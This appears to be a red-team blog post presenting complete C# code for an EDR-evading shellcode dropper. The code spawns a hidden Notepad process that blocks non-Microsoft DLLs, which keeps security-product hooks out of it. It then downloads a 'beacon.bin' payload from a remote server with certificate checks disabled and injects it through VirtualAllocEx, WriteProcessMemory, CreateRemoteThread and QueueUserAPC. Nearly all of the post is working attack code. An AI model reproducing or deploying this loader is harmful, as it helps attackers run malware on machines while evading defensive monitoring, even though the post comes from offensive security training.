---
layout: post
title: Avoiding EDRs creating a new process
excerpt_separator: <!--more-->
---

Code snippet to create a process using the "PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON" flag, which blocks 3rd party DLLs to be injected in it (such as EDR DLLs).

<!--more-->


So, it only allows Microsoft DLLs to be injected. After creating the process, the code injects shellcode in it using (*VirtualAllocEx* + *WriteProcessMemory* + *VirtualProtectEx* + *CreateRemoteThread* + *QueueUserAPC*).

There are two versions:

- [calc](https://github.com/ricardojoserf/non-ms-binaries/tree/main/calc): It creates Notepad process and the hardcoded payload spawns the calculator. You can check if this generates alerts by itself.

- [dropper](https://github.com/ricardojoserf/non-ms-binaries/tree/main/dropper): It creates Notepad process and downloads the payload from a remote server.

Github repository: [non-ms-binaries](https://github.com/ricardojoserf/non-ms-binaries)

![image](https://github.com/ricardojoserf/non-ms-binaries/blob/main/image.png?raw=true)

### Sources:

- [https://github.com/leoloobeek/csharp/](https://github.com/leoloobeek/csharp/)

- Rastamouse's RTO2 course

### Code

```
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Threading.Tasks;

public class NonMsBinaries
{
    // Injection
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    // Create process
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(string? lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        [MarshalAs(UnmanagedType.Bool)]
        public bool bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
    const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const uint CREATE_NO_WINDOW = 0x08000000;
    const uint CREATE_SUSPENDED = 0x00000004;

    static async Task Main(string[] args)
    {

        var lpSize = IntPtr.Zero;
        var success = InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
        var pInfo = new PROCESS_INFORMATION();
        var siEx = new STARTUPINFOEX();
        siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
        IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

        success = UpdateProcThreadAttribute(
            siEx.lpAttributeList,
            0,
            (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            lpMitigationPolicy,
            (IntPtr)IntPtr.Size,
            IntPtr.Zero,
            IntPtr.Zero);
        if (!success)
        {
            Console.WriteLine("[!] Failed to set process mitigation policy");
        }
        var ps = new SECURITY_ATTRIBUTES();
        var ts = new SECURITY_ATTRIBUTES();
        ps.nLength = Marshal.SizeOf(ps);
        ts.nLength = Marshal.SizeOf(ts);
        string spawned_process = "notepad";
        bool ret = CreateProcess(null, spawned_process, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
        if (!ret)
        {
            Console.WriteLine("[!] Proccess failed to execute!");
        }
        else
        {
            Console.WriteLine("[+] Created process with PID: " + pInfo.dwProcessId);
        }

        byte[] shellcode = { };
        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
        using (System.Net.WebClient myWebClient = new System.Net.WebClient())
        {
            try
            {
                string ip_address = "127.0.0.1";
                string payload_name = "beacon.bin";
                shellcode = myWebClient.DownloadData("https://"+ip_address+"/"+payload_name);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        var baseAddress = VirtualAllocEx(
            pInfo.hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            (uint)(AllocationType.Commit | AllocationType.Reserve),
            (uint)MemoryProtection.ReadWrite);

        WriteProcessMemory(
            pInfo.hProcess,
            baseAddress,
            shellcode,
            shellcode.Length,
            out _);

        VirtualProtectEx(
            pInfo.hProcess,
            baseAddress,
            (UIntPtr)(uint)shellcode.Length,
            (uint)MemoryProtection.ExecuteRead,
            out _);

        IntPtr Thread_id = IntPtr.Zero;
        IntPtr Thread_handle = CreateRemoteThread(
            pInfo.hProcess,
            IntPtr.Zero,
            0,
            (IntPtr)0xfff,
            IntPtr.Zero,
            0x00000004,
            out Thread_id);

        var remoteBaseAddress = baseAddress;
        QueueUserAPC(
            remoteBaseAddress, // point to the shellcode location
            Thread_handle,  // primary thread of process
            (IntPtr)0);

        ResumeThread(Thread_handle);

    }
```
